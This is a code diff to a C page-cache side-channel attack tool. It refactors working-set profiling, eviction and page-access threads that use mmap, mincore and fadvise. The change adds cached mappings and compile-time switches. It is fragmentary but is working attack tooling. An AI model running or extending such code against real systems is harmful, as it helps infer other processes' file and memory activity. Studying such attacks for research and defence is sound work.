@@ -149,6 +149,7 @@ typedef struct _PageSequence_
 typedef struct _CachedFile_
 {
     int fd_;
+    void *addr_;
     size_t size_;
     size_t size_pages_;
     size_t resident_memory_;
@@ -770,6 +771,7 @@ int initCachedFile(CachedFile *cached_file)
 {
     memset(cached_file, 0, sizeof(CachedFile));
     cached_file->fd_ = -1;
+    cached_file->addr_ = MAP_FAILED;
     if (!dynArrayInit(&cached_file->resident_page_sequences_, sizeof(PageSequence), ARRAY_INIT_CAP))
     {
         return -1;
@@ -782,6 +784,11 @@ void closeCachedFile(void *arg)
 {
     CachedFile *cached_file = arg;
 
+    if (cached_file->addr_ != MAP_FAILED && cached_file->addr_ != NULL)
+    {
+        munmap(cached_file->addr_, cached_file->size_);
+        cached_file->addr_ = MAP_FAILED;
+    }
     if (cached_file->fd_ >= 0)
     {
         close(cached_file->fd_);
@@ -1006,7 +1013,15 @@ int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path)
 {
     FTS *fts_handle = NULL;
     FTSENT *current_ftsent = NULL;
-    CachedFile current_cached_file = {0};
+    // init so that closing works, but without reserving
+    CachedFile current_cached_file = {
+        .fd_ = -1,
+        .addr_ = MAP_FAILED,
+        .size_ = 0,
+        .size_pages_ = 0,
+        .resident_memory_ = 0,
+        .resident_page_sequences_ = {0}
+    };
     size_t checked_files = 0;
     size_t memory_checked = 0;
     size_t mem_in_ws = 0;
@@ -1047,7 +1062,7 @@ int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path)
         {
             DEBUG_PRINT((DEBUG "Found possible shared object: %s\n", current_ftsent->fts_path));
 
-            // check if the shared object matches the target
+            // check if the found file matches the eviction file or the target and skip if so
             if (!strcmp(current_ftsent->fts_name, EVICTION_FILENAME) ||
                 !strcmp(current_ftsent->fts_path, target_obj_path))
             {
@@ -1055,21 +1070,20 @@ int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path)
                 continue;
             }
 
+            // check if file is not empty, otherwise skip
             if (current_ftsent->fts_statp->st_size == 0)
             {
                 DEBUG_PRINT((DEBUG "File %s has zero size skipping...\n", current_ftsent->fts_name));
                 continue;
             }
 
-            // prepare cached file object
-            // ignore errors, try again
+            // prepare cached file object, skip in case of error
             if (initCachedFile(&current_cached_file) < 0)
             {
                 DEBUG_PRINT((DEBUG "Error at initCachedFile...\n"));
                 continue;
             }
-            // open file, do not update access time (faster)
-            // ignore errors, try again
+            // open file, do not update access time (faster), skip in case of errors
             current_cached_file.fd_ = open(current_ftsent->fts_accpath, O_RDONLY | O_NOATIME);
             if (current_cached_file.fd_ < 0)
             {
@@ -1080,9 +1094,10 @@ int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path)
             }
             current_cached_file.size_ = current_ftsent->fts_statp->st_size;
             current_cached_file.size_pages_ = (current_cached_file.size_ + PAGE_SIZE - 1) / PAGE_SIZE;
+            // advise random access to avoid readahead (we dont want to change the working set)
+            posix_fadvise(current_cached_file.fd_, 0, 0, POSIX_FADV_RANDOM);
 
-            // parse page sequences
-            // ignore errors, try again
+            // parse page sequences, skip in case of errors
             if (profileResidentPageSequences(&current_cached_file, ws->ps_add_threshold_) < 0)
             {
                 printf(WARNING "Error at profileResidentPageSequences: %s...\n", current_ftsent->fts_accpath);
@@ -1098,7 +1113,7 @@ int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path)
             // else add current cached file to cached files
             else
             {
-                // ignore errors, try again
+                // skip in case of errors
                 if (!listAppendBack(&ws->resident_files_, &current_cached_file))
                 {
                     closeCachedFile(&current_cached_file);
@@ -1133,7 +1148,6 @@ cleanup:
 int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold)
 {
     int ret = 0;
-    void *mapping_addr = MAP_FAILED;
     unsigned char *page_status = NULL;
     PageSequence sequence = {0};
 
@@ -1142,29 +1156,28 @@ int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_
     // reset resident memory
     current_cached_file->resident_memory_ = 0;
 
-    // advise random access to avoid readahead
-    posix_fadvise(current_cached_file->fd_, 0, 0, POSIX_FADV_RANDOM);
-
-    mapping_addr =
-        mmap(NULL, current_cached_file->size_, PROT_READ | PROT_EXEC, MAP_PRIVATE, current_cached_file->fd_, 0);
-    if (mapping_addr == MAP_FAILED)
+    // mmap file if not already mapped
+    if(current_cached_file->addr_ == MAP_FAILED)
     {
-        DEBUG_PRINT((DEBUG "Error (%s) at mmap...\n", strerror(errno)));
-        goto error;
+        current_cached_file->addr_ =
+            mmap(NULL, current_cached_file->size_, PROT_READ | PROT_EXEC, MAP_PRIVATE, current_cached_file->fd_, 0);
+        if (current_cached_file->addr_ == MAP_FAILED)
+        {
+            DEBUG_PRINT((DEBUG "Error (%s) at mmap...\n", strerror(errno)));
+            goto error;
+        }
     }
+    // advise random access to avoid readahead (we dont want to change the working set)
+    madvise(current_cached_file->addr_, current_cached_file->size_, MADV_RANDOM);
 
-    // advise random access to avoid readahead
-    // NOTE on linux actually posix_fadvise and madvise use the same internal functions so this is kind of redundant
-    madvise(mapping_addr, current_cached_file->size_, MADV_RANDOM);
-
+    // get status of the file pages
     page_status = malloc(current_cached_file->size_pages_);
     if (page_status == NULL)
     {
         DEBUG_PRINT((DEBUG "Error (%s) at malloc...\n", strerror(errno)));
         goto error;
     }
-
-    if (mincore(mapping_addr, current_cached_file->size_, page_status) != 0)
+    if (mincore(current_cached_file->addr_, current_cached_file->size_, page_status) != 0)
     {
         DEBUG_PRINT((DEBUG "Error (%s) at mincore...\n", strerror(errno)));
         goto error;
@@ -1227,12 +1240,21 @@ error:
 
 cleanup:
 
-    if (mapping_addr != MAP_FAILED)
+#ifdef WS_MAP_FILE
+    if(current_cached_file->fd_ > 0) 
     {
-        munmap(mapping_addr, current_cached_file->size_);
+        close(current_cached_file->fd_);
+        current_cached_file->fd_ = -1;
     }
-    free(page_status);
+#else 
+    if(current_cached_file->addr_ != MAP_FAILED)
+    {
+        munmap(current_cached_file->addr_, current_cached_file->size_);
+        current_cached_file->addr_ = MAP_FAILED;
+    }
+#endif 
 
+    free(page_status);
     return ret;
 }
 
@@ -1418,10 +1440,10 @@ size_t evictTargetPage(Attack *attack)
             printf(WARNING "Error (%s) at pread...\n", strerror(errno));
         }
         #ifdef PREAD_TWO_TIMES
-            if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
-            {
-                printf(WARNING "Error (%s) at pread...\n", strerror(errno));
-            }
+        if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
+        {
+            printf(WARNING "Error (%s) at pread...\n", strerror(errno));
+        }
         #endif
     #else 
         tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + (p)*PAGE_SIZE);
@@ -1655,6 +1677,7 @@ void *wsManagerThread(void *arg)
         // reevaluate working set
         DEBUG_PRINT((DEBUG WS_MGR_TAG "Reevaluating working set...\n"));
         // reevaluateWorkingSet fails if eviction was run during the reevaluation
+        // in case of an error the original (current) lists are not changed
         if (ws->evaluation_ && reevaluateWorkingSet(ws) == 0)
         {
             DEBUG_PRINT((WS_MGR_TAG "Rescanned working set now consists of %zu files (%zu bytes mapped).\n", ws->tmp_resident_files_.count_, ws->tmp_mem_in_ws_));
@@ -1759,12 +1782,13 @@ int reevaluateWorkingSet(AttackWorkingSet *ws)
     ws->tmp_mem_in_ws_ = 0;
 
     // reevaluate resident files list
+    // in case of an error the original lists are not changed
     if (reevaluateWorkingSetList(&ws->resident_files_, ws) < 0)
     {
         return -1;
     }
-
     // reevaluate non resident files list
+    // in case of an error the original lists are not changed
     if (reevaluateWorkingSetList(&ws->non_resident_files_, ws) < 0)
     {
         return -1;
@@ -1786,6 +1810,7 @@ int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws)
         next_node = current_cached_file_node->next_;
 
         // copy current cached file and create a new dynarray
+        // the copy ensures that the current state is not changed but kept
         current_cached_file = *((CachedFile *)current_cached_file_node->data_);
         if (!dynArrayInit(&current_cached_file.resident_page_sequences_, sizeof(PageSequence), ARRAY_INIT_CAP))
         {
@@ -1826,7 +1851,6 @@ int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws)
 error:
 
     dynArrayDestroy(&current_cached_file.resident_page_sequences_, NULL);
-
     return -1;
 }
 
@@ -1840,6 +1864,7 @@ void *pageAccessThread(void *arg)
     size_t resident_sequences_length = 0;
     size_t accessed_pages_count = 0;
     size_t accessed_files_count = 0;
+    (void) tmp;
 
     while (__atomic_load_n(&page_thread_data->running_, __ATOMIC_RELAXED))
     {
@@ -1854,8 +1879,13 @@ void *pageAccessThread(void *arg)
         {
             current_cached_file = (CachedFile *)resident_files_node->data_;
 
+#ifdef WS_MAP_FILE
             // advise random access to avoid readahead
-            posix_fadvise(current_cached_file->fd_, 0, 0, POSIX_FADV_RANDOM);
+            madvise(current_cached_file->addr_, current_cached_file->size_, MADV_RANDOM);
+#else 
+            // advise random access to avoid readahead
+            posix_fadvise(current_cached_file->fd_, 0, 0, POSIX_FADV_RANDOM); 
+#endif 
 
             resident_sequences = current_cached_file->resident_page_sequences_.data_;
             resident_sequences_length = current_cached_file->resident_page_sequences_.size_;
@@ -1865,16 +1895,19 @@ void *pageAccessThread(void *arg)
                 for (size_t p = resident_sequences[s].offset_; p < resident_sequences[s].offset_ + resident_sequences[s].length_; p++)
                 {
                     //printf("Accessing offset %zu, %zu length\n", resident_sequences[s].offset_, resident_sequences[s].length_);
-                    //also works with NULL
+#ifdef WS_MAP_FILE
+                    tmp = *((uint8_t *) current_cached_file->addr_ + p * PAGE_SIZE);
+#else
                     if (pread(current_cached_file->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
                     {
                         printf(WARNING WS_MGR_TAG "Error (%s) at pread...\n", strerror(errno));
                     }
-#ifdef PREAD_TWO_TIMES
+    #ifdef PREAD_TWO_TIMES
                     if (pread(current_cached_file->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
                     {
                         printf(WARNING WS_MGR_TAG "Error (%s) at pread...\n", strerror(errno));
                     }
+    #endif
 #endif
                     accessed_pages_count++;
                 }
